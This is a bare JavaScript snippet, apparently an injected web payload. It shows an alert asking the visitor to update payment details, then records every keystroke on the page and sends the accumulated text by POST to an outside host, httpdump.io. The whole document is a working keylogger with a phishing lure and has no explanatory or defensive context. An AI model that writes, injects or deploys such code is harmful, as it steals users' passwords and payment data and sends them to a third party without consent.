alert('please update your payment details');
var l = ""; 
document.onkeypress = function (e) {
	l += e.key;
	var req = new XMLHttpRequest();
	req.open("POST","https://httpdump.io/s_1fg", true);
	req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	req.send("data=" + l);}
